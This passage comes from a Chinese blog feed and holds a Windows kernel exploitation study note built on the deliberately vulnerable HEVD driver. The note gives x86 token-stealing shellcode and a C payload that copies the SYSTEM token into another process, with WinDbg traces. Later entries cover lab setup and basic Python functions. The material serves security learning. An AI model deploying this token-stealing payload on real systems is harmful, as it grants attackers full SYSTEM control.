x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">f8h</span><br></code></pre></td></tr></table></figure><h5 id="从特权进程读取ACCESS-TOKEN"><a href="#从特权进程读取ACCESS-TOKEN" class="headerlink" title="从特权进程读取ACCESS TOKEN"></a>从特权进程读取ACCESS TOKEN</h5><p>为了获得SYSTEM特权，我们需要找到System进程的EPROCESS。 由于System的PID始终为4，因此我们可以通过以下方式找到它：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">loop2:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b8h</span>]<br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">b8h</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b4h</span>], <span class="hljs-number">4</span><br><span class="hljs-keyword">jne</span> loop2<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">f8h</span><br></code></pre></td></tr></table></figure><p>这给了我们System进程的EPROCESS地址。</p><p>_KPROCESS:0xf8→→ Token</p><h5 id="替换非特权进程的访问令牌"><a href="#替换非特权进程的访问令牌" class="headerlink" title="替换非特权进程的访问令牌"></a>替换非特权进程的访问令牌</h5><p>下一步是替换cmd.exe进程的令牌。 只需通过覆盖现有令牌即可完成：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">edx</span>], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>EAX contains offset 0xF8 of the  EPROCESS address of the  System Process .<br> EDX contains offset 0xF8 of the  EPROCESS address of  cmd.exe .</p><h5 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h5><p>汇编代码如下</p><p>用的是nasm+alink</p><p>nasm和alink可以在这里下载：<a href="http://www.nasm.us/"><code>nasm</code></a>，<a href="http://alink.sourceforge.net/download.html"><code>alink</code></a>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">BITS</span> <span class="hljs-number">32</span><br><span class="hljs-meta">section</span> .text<br><span class="hljs-comment">;当前进程的EPROCESS</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span>  <span class="hljs-built_in">fs</span>:[<span class="hljs-number">0x124</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">eax</span> + <span class="hljs-number">0x150</span>]  <span class="hljs-comment">;获取_KPROCESS</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">eax</span> + <span class="hljs-number">0x140</span>] <span class="hljs-comment">;获取父进程的PID</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;获取_KPROCESS</span><br><span class="hljs-symbol">loop1:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb8</span>] <span class="hljs-comment">;获取_LIST_ENTRY</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0xb8</span>  <span class="hljs-comment">; 获取_KPROCESS</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb4</span>], <span class="hljs-built_in">ebx</span>  <span class="hljs-comment">;进程的PID和父进程的PID比较</span><br><span class="hljs-keyword">jne</span> loop1  <span class="hljs-comment">;相等退出循环</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span>  <span class="hljs-comment">;获取_KPROCESS</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0xf8</span>  <span class="hljs-comment">;获取_KPROCESS偏移0xf8处的Token，这里是父进程（cmd.exe）的token</span><br><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span> <span class="hljs-comment">;清空</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;获取_KPROCESS</span><br><span class="hljs-symbol">loop2:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb8</span>]  <span class="hljs-comment">;获取_LIST_ENTRY</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0xb8</span>  <span class="hljs-comment">; 获取_KPROCESS</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb4</span>], <span class="hljs-number">4</span>  <span class="hljs-comment">;进程的PID和System的PID比较</span><br><span class="hljs-keyword">jne</span> loop2  <span class="hljs-comment">;相等退出循环</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ecx</span>  <span class="hljs-comment">; 获取_KPROCESS</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0xf8</span>  <span class="hljs-comment">;获取_KPROCESS偏移0xf8处的Token，这块的就是system的token</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">eax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">edx</span>], <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;用system的token替换cmd.exe进程的token</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>编译链接</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stata">F:\nasm&gt;nasm -fwin32 <span class="hljs-keyword">shell</span>.asm<br><br>F:\nasm&gt; alink -oPE <span class="hljs-keyword">shell</span>.obj<br>ALINK v1.6 (C) <span class="hljs-keyword">Copyright</span> 1998-9 Anthony A.J. Williams.<br>All Rights Reserved<br><br>Loading <span class="hljs-keyword">file</span> <span class="hljs-keyword">shell</span>.obj<br>matched Externs<br>matched ComDefs<br>Generating PE <span class="hljs-keyword">file</span> <span class="hljs-keyword">shell</span>.exe<br>Warning, <span class="hljs-keyword">no</span> entry point specified<br><br>F:\nasm&gt;<span class="hljs-keyword">shell</span><br><br>F:\nasm&gt;<br></code></pre></td></tr></table></figure><p>这个例子提权没成功，程序崩溃，也没找到原因，还是先回到题目吧</p><h5 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h5><p>首先会通过fs段寄存器获取_KTHREAD结构体，fs段寄存器存放了关于线程的各种信息，当处于内核态时，fs的值为0x30，处于用户态时fs值则为0x3b</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; r fs<br>fs=<span class="hljs-number">00000030</span><br>kd&gt; dd fs:[<span class="hljs-number">124</span>]<br><span class="hljs-number">0030</span>:<span class="hljs-number">00000124</span>  <span class="hljs-number">83f6f380</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f6f380</span> <span class="hljs-number">00000100</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000134</span>  <span class="hljs-number">60010115</span> <span class="hljs-number">0001003</span>f <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000144</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> ffff0ff<span class="hljs-number">0 00000400</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000154</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000164</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000174</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83</span>efeae<span class="hljs-number">7 83e41f64</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000184</span>  <span class="hljs-number">00000002</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f62658</span> <span class="hljs-number">83</span>e41e8d<br><span class="hljs-number">0030</span>:<span class="hljs-number">00000194</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000080</span> <span class="hljs-number">83</span>e41f10<br>kd&gt; dt _KTHREAD <span class="hljs-number">83f6f380</span><br>ntdll!_KTHREAD<br>   +<span class="hljs-number">0</span>x000 Header           : _DISPATCHER_HEADER<br>   +<span class="hljs-number">0</span>x010 CycleTime        : <span class="hljs-number">0</span>x0000008e`<span class="hljs-number">2d</span>27fbf3<br>  ...<br>   +<span class="hljs-number">0</span>x03c Reserved         : <span class="hljs-number">0</span>y0000000<span class="hljs-number">00000000000</span> (<span class="hljs-number">0</span>)<br>   +<span class="hljs-number">0</span>x03c MiscFlags        : <span class="hljs-number">0</span>n8193<br>   +<span class="hljs-number">0</span>x040 ApcState         : _KAPC_STATE<br>   +<span class="hljs-number">0</span>x040 ApcStateFill     : [<span class="hljs-number">23</span>]  &quot;???&quot;<br>   +<span class="hljs-number">0</span>x057 Priority         : <span class="hljs-number">0</span> &#x27;&#x27;<br> ...<br> kd&gt; dt _KAPC_STATE<br>ntdll!_KAPC_STATE<br>   +<span class="hljs-number">0</span>x000 ApcListHead      : [<span class="hljs-number">2</span>] _LIST_ENTRY<br>   +<span class="hljs-number">0</span>x010 Process          : Ptr32 _KPROCESS<br>   +<span class="hljs-number">0</span>x014 KernelApcInProgress : UChar<br>   +<span class="hljs-number">0</span>x015 KernelApcPending : UChar<br>   +<span class="hljs-number">0</span>x016 UserApcPending   : UChar<br></code></pre></td></tr></table></figure><p>KTHREAD结构的偏移0x50处为KPROCESS结构，而KPROCESS为EPROCESS结构的第一个字段，即定位到了_EPROCESS结构。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; dd <span class="hljs-number">83f6f380</span>+<span class="hljs-number">50</span><br>ReadVirtual: <span class="hljs-number">83f6f3d0</span> not properly sign extended<br><span class="hljs-number">83f6f3d0</span>  <span class="hljs-number">859f8a20</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f3e0</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">000064e0</span> <span class="hljs-number">00020002</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f3f0</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f400</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f410</span>  <span class="hljs-number">00000008</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f6f488</span> <span class="hljs-number">83f6f488</span><br><span class="hljs-number">83f6f420</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f430</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000060</span> <span class="hljs-number">83</span>fa49c0<br><span class="hljs-number">83f6f440</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f6f380</span> <span class="hljs-number">00000000</span><br>kd&gt; dt _EPROCESS <span class="hljs-number">859f8a20</span><br>ntdll!_EPROCESS<br>   +<span class="hljs-number">0</span>x000 Pcb              : _KPROCESS<br>   +<span class="hljs-number">0</span>x098 ProcessLock      : _EX_PUSH_LOCK<br>   +<span class="hljs-number">0</span>x0a0 CreateTime       : _LARGE_INTEGER <span class="hljs-number">0</span>x01d6cfbb`f72e7f4c<br>   +<span class="hljs-number">0</span>x0a8 ExitTime         : _LARGE_INTEGER <span class="hljs-number">0</span>x0<br>   +<span class="hljs-number">0</span>x0b0 RundownProtect   : _EX_RUNDOWN_REF<br>   +<span class="hljs-number">0</span>x0b4 UniqueProcessId  : <span class="hljs-number">0x00000004</span> Void<br>   +<span class="hljs-number">0</span>x0b8 ActiveProcessLinks : _LIST_ENTRY [ <span class="hljs-number">0</span>x86df60d8 - <span class="hljs-number">0</span>x83f7cf18 ]<br>   +<span class="hljs-number">0</span>x0c0 ProcessQuotaUsage : [<span class="hljs-number">2</span>] <span class="hljs-number">0</span><br>   +<span class="hljs-number">0</span>x0c8 ProcessQuotaPeak : [<span class="hljs-number">2</span>] <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>一旦获取了<em>EPROCESS结构，我们能做很多事情，最简单的，观察偏移0xb4位置，存放着当前进程的PID，而0xb8位置，存放着一个</em>LIST_ENTRY结构，这个结构存放着前面一个<em>EPROCESS和后一个</em>EPROCESS，这就很有意思了。</p><p>我可以通过这种方法，遍历当前系统所有存在的<em>EPROCESS，而且能够找到System的</em>EPROCESS，实际上，这个_EPROCESS，我们通过Windbg的!process 0 0的方法可以获取到。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> system<br>PROCESS <span class="hljs-number">859f8a20</span>  SessionId: none  Cid: <span class="hljs-number">0004</span>    Peb: <span class="hljs-number">00000000</span>  ParentCid: <span class="hljs-number">0000</span><br>    DirBase: <span class="hljs-number">00185000</span>  ObjectTable: <span class="hljs-number">89001b60</span>  HandleCount: <span class="hljs-number">495</span>.<br>    Image: System<br><br>kd&gt; dt _LIST_ENTRY <span class="hljs-number">859f8a20</span>+b8<br>ntdll!_LIST_ENTRY<br> [ <span class="hljs-number">0</span>x86df60d8 - <span class="hljs-number">0</span>x83f7cf18 ]<br>   +<span class="hljs-number">0</span>x000 Flink            : <span class="hljs-number">0</span>x86df60d8 _LIST_ENTRY [ <span class="hljs-number">0</span>x873fe0e8 - <span class="hljs-number">0</span>x859f8ad8 ]<br>   +<span class="hljs-number">0</span>x004 Blink            : <span class="hljs-number">0</span>x83f7cf18 _LIST_ENTRY [ <span class="hljs-number">0</span>x859f8ad8 - <span class="hljs-number">0</span>x879dd320 ]<br>kd&gt; dd <span class="hljs-number">859f8a20</span>+b8<br>ReadVirtual: <span class="hljs-number">859</span>f8ad8 not properly sign extended<br><span class="hljs-number">859</span>f8ad8  <span class="hljs-number">86d</span>f60d8 <span class="hljs-number">83</span>f7cf<span class="hljs-number">18 00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859</span>f8ae8  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">0000000</span>b <span class="hljs-number">83</span>f70cc0<br><span class="hljs-number">859</span>f8af8  <span class="hljs-number">00000000</span> <span class="hljs-number">007c7000</span> <span class="hljs-number">00250000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859f8b08</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">89001b60</span><br><span class="hljs-number">859f8b18</span>  <span class="hljs-number">890012c4</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859f8b28</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">85</span>a03e<span class="hljs-number">00 00000000</span><br><span class="hljs-number">859f8b38</span>  <span class="hljs-number">00000004</span> <span class="hljs-number">00000040</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859f8b48</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br>kd&gt; dt _EPROCESS <span class="hljs-number">86d</span>f60d8-b8  ；这就是system的_EPROCESS<br>ntdll!_EPROCESS<br>   +<span class="hljs-number">0</span>x000 Pcb              : _KPROCESS<br>   +<span class="hljs-number">0</span>x098 ProcessLock      : _EX_PUSH_LOCK<br>   +<span class="hljs-number">0</span>x0a0 CreateTime       : _LARGE_INTEGER <span class="hljs-number">0</span>x01d6cfbb`f73f28ee<br>   +<span class="hljs-number">0</span>x0a8 ExitTime         : _LARGE_INTEGER <span class="hljs-number">0</span>x0<br>   +<span class="hljs-number">0</span>x0b0 RundownProtect   : _EX_RUNDOWN_REF<br>   +<span class="hljs-number">0</span>x0b4 UniqueProcessId  : <span class="hljs-number">0x00000100</span> Void<br>   +<span class="hljs-number">0</span>x0b8 ActiveProcessLinks : _LIST_ENTRY [ <span class="hljs-number">0</span>x873fe0e8 - <span class="hljs-number">0</span>x859f8ad8 ]<br>   +<span class="hljs-number">0</span>x0c0 ProcessQuotaUsage : [<span class="hljs-number">2</span>] <span class="hljs-number">0</span>x2f8<br></code></pre></td></tr></table></figure><p>回到shellcode，后面有一个loop循环，在循环中做的事情就是不断通过链表的前向指针和后向指针找到System的_EPROCESS结构，也就是＋0xb4位置的PID为4的结构，在结构中存放着token，只要找到System的token，替换掉当前进程的token，就可以完成提权了。</p><p>payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">VOID <span class="hljs-title">TokenStealingPayloadWin7</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// Importance of Kernel Recovery</span><br>    __asm &#123;<br>        pushad                               ; Save registers state<br><br>        ; Start of Token Stealing Stub<br>        <span class="hljs-keyword">xor</span> eax, eax                         ; Set ZERO<br>        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread<br>                                             ; _KTHREAD is located at FS:[<span class="hljs-number">0x124</span>]<br><br>        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process<br><br>        mov ecx, eax                         ; Copy current process _EPROCESS structure<br><br>        mov edx, SYSTEM_PID                  ; WIN <span class="hljs-number">7</span> SP1 SYSTEM process PID = <span class="hljs-number">0x4</span><br><br>        SearchSystemPID:<br>            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink<br>            sub eax, FLINK_OFFSET<br>            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId<br>            jne SearchSystemPID<br><br>        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token<br>        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token<br>                                             ; with SYSTEM process nt!_EPROCESS.Token<br>        ; End of Token Stealing Stub<br><br>        popad                                ; Restore registers state<br><br>        ; Kernel Recovery Stub<br>        <span class="hljs-keyword">xor</span> eax, eax                         ; Set NTSTATUS SUCCEESS<br>        add esp, <span class="hljs-number">12</span>                          ; Fix the <span class="hljs-built_in">stack</span><br>        pop ebp                              ; Restore saved EBP<br>        ret <span class="hljs-number">8</span>                                ; Return cleanly<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html">https://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html</a></p><p><a href="https://www.cnblogs.com/huity35/p/11231155.html">https://www.cnblogs.com/huity35/p/11231155.html</a></p>]]></content>
    
    
    <categories>
      
      <category>window kernel</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows 内核漏洞利用学习--（1）  环境配置</title>
    <link href="/2022/02/21/Windows_Kernel_Exploit_study_ENV/"/>
    <url>/2022/02/21/Windows_Kernel_Exploit_study_ENV/</url>
    
    <content type="html"><![CDATA[<p>这里记录Windows内核漏洞的学习过程，准备过一遍HEVD的内核漏洞，先把这个坑开了吧</p><span id="more"></span><h6 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h6><p>靶机：Windows 7 pro sp1 x86（暂时先调这个</p><p>主机：Windows 10  10.0.19042.630</p><p>主机调试用到的工具：WinDbg Preview，VirtualKD-Redux</p><p>靶机用到：OSR loader，HEVD </p><p>相关工具下载：</p><p><a href="https://www.osronline.com/article.cfm%5earticle=157.htm">https://www.osronline.com/article.cfm%5earticle=157.htm</a></p><p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></p><p><a href="https://github.com/4d61726b/VirtualKD-Redux">https://github.com/4d61726b/VirtualKD-Redux</a></p><h6 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h6><p>要设置符号路径，填入HEVD的路径</p><h6 id="VirtualKD-Redux"><a href="#VirtualKD-Redux" class="headerlink" title="VirtualKD-Redux"></a>VirtualKD-Redux</h6><p>1.拷贝 <strong>target</strong> 到目标虚拟机 (32位系统拷贝target32，64位系统拷贝target64)</p><p>2.虚拟机中执行 target 文件夹中的 <strong>vminstall.exe</strong> 文件，默认安装即可，最后一步会重启虚拟机</p><p>3.根据物理机环境，打开对应版本的 <strong>vmmon.exe</strong> (32位系统打开vmmon32.exe，64位系统打开vmmon64.exe)</p><p>4.选取对应的windbg版本，<strong>VirtualKD-Redux</strong>会替我们自动设置调试器路径，建议 简单检查</p><p>5.虚拟机在重启中，选择新建的入口，按F8 选择禁用强制签名</p><h6 id="编译驱动程序"><a href="#编译驱动程序" class="headerlink" title="编译驱动程序"></a>编译驱动程序</h6><p>1.安装WDK</p><p>2.VS新建一个空的内核模式驱动程序</p><p>3.把HEVD源代码中的.c,.h文件都导入到新项目</p><p>4.配置项目属性：</p><p>C/C++:将警告视为错误设为否</p><p>安全检查设为禁用</p><p>Driver setting:确定目标OS,目标平台选Desktop</p><p>5.生成解决方案</p><p>OSR loader加载驱动</p><p>参考：</p><p><a href="https://bbs.pediy.com/thread-261326.htm">https://bbs.pediy.com/thread-261326.htm</a></p><p><a href="https://bbs.pediy.com/thread-252309.htm">https://bbs.pediy.com/thread-252309.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/02/21/python_notes/"/>
    <url>/2022/02/21/python_notes/</url>
    
    <content type="html"><![CDATA[<h3 id="1-chr-函数"><a href="#1-chr-函数" class="headerlink" title="1.chr() 函数"></a>1.chr() 函数</h3><p>chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。</p><p>用法：chr(i)</p><p>i可以是10进制也可以是16进制的形式的数字。</p><h3 id="2-ord-函数"><a href="#2-ord-函数" class="headerlink" title="2.ord() 函数"></a>2.ord() 函数</h3><p>ord() 函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。</p><p>用法：ord(c)</p><p>c为字符</p><p>返回值是对应的十进制整数。</p><h3 id="3-进制转换"><a href="#3-进制转换" class="headerlink" title="3.进制转换"></a>3.进制转换</h3><p>2进制：满2进1  , 0b10</p><p>8进制：满8进1  , 0o10</p><p>10进制：满10进1  , 10</p><p>16进制：满16进1  , 0x10</p><p>时间满60进1</p><p>bin()  转2进制方法</p><p>int()  转10进制方法</p><p>oct()  转8进制方法</p><p>hex()  转16进制方法</p><p>其余进制转十进制的方法是：语法int(字符串<strong>数字</strong>，base=2\8\16(表示字符串<strong>数字本身</strong>是2进制还是8进制还是16进制))</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(a,base=<span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(a,base=<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(a,base=<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure><p>a的格式必须为数字字符串。</p><h3 id="4-eval（）函数"><a href="#4-eval（）函数" class="headerlink" title="4.eval（）函数"></a>4.eval（）函数</h3><p>eval() 函数用来执行一个字符串表达式，并返回表达式的值。</p><p>以下展示了使用 eval() 方法的实例：</p><p>&gt;&gt;&gt;x = 